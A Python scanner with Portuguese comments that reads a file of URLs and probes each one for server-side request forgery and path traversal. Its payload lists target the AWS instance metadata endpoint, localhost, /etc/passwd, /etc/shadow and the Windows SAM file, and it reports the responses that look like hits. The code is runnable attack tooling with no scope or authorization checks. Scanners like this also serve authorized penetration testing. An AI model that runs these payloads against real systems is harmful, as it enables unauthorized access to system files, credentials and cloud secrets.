import requests
import logging

# Configurações de logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Payloads para exploração de SSRF
ssrf_payloads = [
    "http://localhost:80",
    "http://127.0.0.1",
    "http://169.254.169.254/latest/meta-data/",  # AWS Instance Metadata
    "http://example.com",  # URL externa para testar
    "http://[::1]",  # IPv6 localhost
    "http://169.254.169.254"  # Link local do IPv4
]

# Payloads para exploração de Path Traversal
path_traversal_payloads = [
    "../../etc/passwd",
    "../../../../../etc/shadow",
    "..%2F..%2F..%2Fetc%2Fpasswd",  # URL-encoded version
    "../../../../var/log/apache2/access.log",  # Exemplo de arquivo de log
    "..\\..\\..\\Windows\\System32\\config\\SAM"  # Windows Path Traversal
]

# Função para testar SSRF
def test_ssrf(url):
    results = []
    for payload in ssrf_payloads:
        try:
            response = requests.get(url, params={"url": payload}, timeout=5)  # Adaptar dependendo do endpoint
            if response.status_code == 200:
                if "unexpected response" not in response.text.lower():
                    results.append(f"[+] Possível SSRF detectado com payload: {payload} na URL: {url}")
                    logging.info(f"SSRF detectado: {url} com payload {payload}")
            else:
                logging.warning(f"[{response.status_code}] Não vulnerável: {url} com payload {payload}")
        except requests.RequestException as e:
            logging.error(f"[!] Erro ao testar SSRF com payload {payload}: {e}")
    return results

# Função para testar Path Traversal
def test_path_traversal(url):
    results = []
    for payload in path_traversal_payloads:
        try:
            response = requests.get(f"{url}/{payload}", timeout=5)
            if response.status_code == 200:
                results.append(f"[+] Possível Path Traversal detectado com payload: {payload} na URL: {url}")
                logging.info(f"Path Traversal detectado: {url}/{payload}")
            else:
                logging.warning(f"[{response.status_code}] Não vulnerável: {url}/{payload}")
        except requests.RequestException as e:
            logging.error(f"[!] Erro ao testar Path Traversal com payload {payload}: {e}")
    return results

# Função principal para ler URLs do arquivo e testar vulnerabilidades
def main(file_path):
    try:
        with open(file_path, "r") as file:
            urls = file.read().splitlines()
    except FileNotFoundError:
        logging.error(f"[Erro] Arquivo não encontrado: {file_path}. Verifique o caminho e tente novamente.")
        return

    logging.info(f"Iniciando teste de vulnerabilidades SSRF e Path Traversal nas URLs do arquivo: {file_path}\n")
    all_vulnerabilities = []

    for url in urls:
        logging.info(f"\nTestando URL: {url}")
        results_ssrf = test_ssrf(url)
        results_path_traversal = test_path_traversal(url)
        all_vulnerabilities.extend(results_ssrf + results_path_traversal)

    # Relatório final de vulnerabilidades
    logging.info("\n[Relatório de Vulnerabilidades Encontradas]")
    for vuln in all_vulnerabilities:
        logging.info(vuln)

if __name__ == "__main__":
    file_path = input("URLs File: ")
    main(file_path)
